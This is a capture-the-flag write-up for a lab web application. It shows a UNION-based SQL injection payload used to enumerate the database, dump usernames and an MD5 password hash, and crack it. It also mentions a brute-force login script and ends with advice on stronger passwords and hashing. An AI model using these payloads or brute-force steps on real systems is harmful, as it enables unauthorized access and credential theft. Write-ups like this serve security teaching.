@@ -1,0 +1,187 @@
+We notice there is a SQL injection vulnerability in the http://$IP/?page=member page
+
+We try with different payloads until we find one that works:
+
+First we get all the schemas and tables in the database:
+
+ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
+First name: Flag
+Surname : GetThe
+
+...
+
+ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
+First name: Member_Brute_Force
+Surname : db_default
+
+ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
+First name: Member_Sql_Injection
+Surname : users
+
+ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
+First name: Member_guestbook
+Surname : guestbook
+
+ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
+First name: Member_images
+Surname : list_images
+
+ID:  1 or 1 = 1 UNION SELECT table_schema, table_name from INFORMATION_SCHEMA.COLUMNS
+First name: Member_survey
+Surname : vote_dbs
+
+
+
+
+
+-------------------------------------------------------------------------------------
+
+
+
+
+
+Then we get the tables and columns in the database:
+
+...
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: db_default
+Surname : id
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: db_default
+Surname : username
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: db_default
+Surname : password
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: users
+Surname : user_id
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: users
+Surname : first_name
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: users
+Surname : last_name
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: users
+Surname : town
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: users
+Surname : country
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: users
+Surname : planet
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: users
+Surname : Commentaire
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: users
+Surname : countersign
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: guestbook
+Surname : id_comment
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: guestbook
+Surname : comment
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: guestbook
+Surname : name
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: list_images
+Surname : id
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: list_images
+Surname : url
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: list_images
+Surname : title
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: list_images
+Surname : comment
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: vote_dbs
+Surname : id_vote
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: vote_dbs
+Surname : vote
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: vote_dbs
+Surname : nb_vote
+
+ID:  1 or 1 = 1 UNION SELECT table_name, column_name from INFORMATION_SCHEMA.COLUMNS
+First name: vote_dbs
+Surname : subject
+
+
+
+
+
+
+------------------------------------------------------------------------------------
+
+
+
+
+We notice there is a username and password in the table db_default in the Member_Brute_Force schema:
+
+
+ID:  1 or 1 = 1 UNION SELECT username, password from Member_Brute_Force.db_default
+First name: root
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+ID:  1 or 1 = 1 UNION SELECT username, password from Member_Brute_Force.db_default
+First name: admin
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+
+
+------------------------------------------------------------------------------------
+
+
+
+After decrypting the MD5 hash, we get the password:
+3bf1114a986ba87ed28fc1b5884fc2f8:shadow
+
+Then we can use the username and password to log in in the http://$IP/index.php?page=signin page and get the flag.
+
+
+Finally, inspired by the name of the DB and given the weakness of the password, we realize that another way in which we could have obtained this flag would have been by brute force.
+We create a script that brute forces the login form using the most common usernames and passwords:
+```bash
+ ./bruteforce_users_passwords.py --ip $IP
+```
+So we are going to focus the explanation of this vulnerability from this point of view.
+
+------------------------------------------------------------------------------------
+
+This flag can be exploited in two ways:
+    - SQL injection, explained in the previous flag.
+    - Weak password
+
+To protect users from weak credentials there are different ways to improve:
+    - To begin with, the first would be to force users to use long passwords, with a variety of characters and also provide additional two-factor authentication mechanisms.
+    - Additionally, security could be improved when storing these passwords since we see that the hash used is nothing more than a simple md5 which is quite easy to break with a dictionary attack, or brute force if the password is short or common. For example, using:
+        - a hash+salt strategy would make reversing the hash more difficult
+        - an additional pepper (which is like a salt but kept as an application secret)
+        - more modern and secure hashing algorithms such as bcrypt that slow down the hashing time, making encryption slower.
+
